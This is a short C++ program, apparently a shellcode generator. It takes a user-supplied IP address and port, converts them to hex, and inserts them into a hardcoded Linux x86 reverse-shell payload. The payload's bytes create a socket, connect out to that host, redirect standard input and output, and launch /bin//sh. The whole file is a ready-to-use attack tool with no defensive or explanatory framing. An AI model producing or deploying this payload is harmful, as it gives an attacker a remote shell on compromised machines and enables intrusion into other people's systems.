#include <iostream>
#include <sstream>
#include <string>       // std::string
#include <stdio.h>
#include <string.h>
using namespace std;
void Get_IPv4_Hex(string IP_Address,char Separator,bool Header,string& IP_Address_Result)
{
	// Variables Temps
	int* Sections = new int[4];
	char* Hash = new char[2]();
	char* Hex_Values = new char[17];

	// Fill Hex Values
	Hex_Values[0] = '0';
	Hex_Values[1] = '1';
	Hex_Values[2] = '2';
	Hex_Values[3] = '3';
	Hex_Values[4] = '4';
	Hex_Values[5] = '5';
	Hex_Values[6] = '6';
	Hex_Values[7] = '7';
	Hex_Values[8] = '8';
	Hex_Values[9] = '9';
	Hex_Values[10] = 'A';
	Hex_Values[11] = 'B';
	Hex_Values[12] = 'C';
	Hex_Values[13] = 'D';
	Hex_Values[14] = 'E';
	Hex_Values[15] = 'F';
	Hex_Values[16] = '\0';

	// Tokenizer IP Numbers
	string* Current_Value = new string();
	int* Current_Quantity = new int();

	for (unsigned int i = 0; i < IP_Address.length(); i++)
	{
		if (IP_Address[i] != Separator)
		{
			(*Current_Value) += IP_Address[i];
		}
		else
		{
			if ((*Current_Quantity) == 0)
			{
				Sections[0] = atoi((*Current_Value).c_str());	// Section 1 IP
			}
			if ((*Current_Quantity) == 1)
			{
				Sections[1] = atoi((*Current_Value).c_str());	// Section 2 IP
			}
			if ((*Current_Quantity) == 2)
			{
				Sections[2] = atoi((*Current_Value).c_str());	// Section 3 IP
			}

			Current_Value->clear();
			(*Current_Quantity)++;
		}
	}
	Sections[3] = atoi((*Current_Value).c_str());	// Section 4 IP

	// Free Memory Tokenizer
	delete Current_Value;
	delete Current_Quantity;

	// Add Header
	if (Header)
	{
                    IP_Address_Result = "0x";
	}

	// Convert Int To Hexadecimal Values
	Hash[0] = Hex_Values[((Sections[0] >> 4) & 0xF)];
	Hash[1] = Hex_Values[(Sections[0]) & 0x0F];
	IP_Address_Result.append(Hash,2);

	Hash[0] = Hex_Values[((Sections[1] >> 4) & 0xF)];
	Hash[1] = Hex_Values[(Sections[1]) & 0x0F];
	IP_Address_Result.append(Hash,2);

	Hash[0] = Hex_Values[((Sections[2] >> 4) & 0xF)];
	Hash[1] = Hex_Values[(Sections[2]) & 0x0F];
	IP_Address_Result.append(Hash,2);

	Hash[0] = Hex_Values[((Sections[3] >> 4) & 0xF)];
	Hash[1] = Hex_Values[(Sections[3]) & 0x0F];
	IP_Address_Result.append(Hash,2);

	// Free Memory
	delete[] Sections;
	delete[] Hash;
	delete[] Hex_Values;
}

int main()
{

int port;
cout<<"Enter IP address : ";
string ip;
cout<<endl;
cin >>ip;
cout<<"Enter PORT :";
cin >>port;
string Result;
Get_IPv4_Hex(ip.c_str(),'.',true,Result);


std::stringstream ss;
ss << std::hex << port;
std::string s = ss.str();
string hexport = ss.str();



string code ="\\x";

if(s.length()==1)
{
 hexport= "0"+s;
}
else if (s.length()==2)
{
string a(1,s[0]);
string b(1,s[1]);
hexport = a+b;
}
else if(s.length()==3)
{
string a(1,s[0]);
string b(1,s[1]);
string c(1,s[2]);
hexport = "0"+a+"\\x"+b+c;
}
else if (s.length()==4)
{
string a(1,s[0]);
string b(1,s[1]);
string c(1,s[2]);
string d(1,s[3]);
hexport = a+b+"\\x"+c+d;
}
hexport = code + hexport;
cout <<"Hex port" <<hexport<<endl;


//hexport="\\x00";
string final;
for (int i =2 ; i<Result.length() ; i++)
{
	final = final + Result[i];
}

string ipshellcode="\\x";

for(int i=0; i < final.length() ; i++)
{
	if(i%2==1 && i != final.length())
	{
 	ipshellcode=ipshellcode+final[i]+"\\x";
	}
	else
	{
	ipshellcode = ipshellcode + final[i];
	}
}
cout<<"IP ADDRESS " <<ipshellcode<<endl;
string shellcode ="\\x31\\xc0\\x31\\xdb\\x53\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xb3\\x01\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x31\\xc9\\x68"+ipshellcode+"66\\x68"+hexport+"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xb3\\x03\\xb0\\x66\\xcd\\x80\\x89\\xf3\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\x83\\xf9\\x02\\x7e\\xf6\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";
printf("%s\n", shellcode.c_str());

//cout<<shellcode<<endl;
exit(0);
}
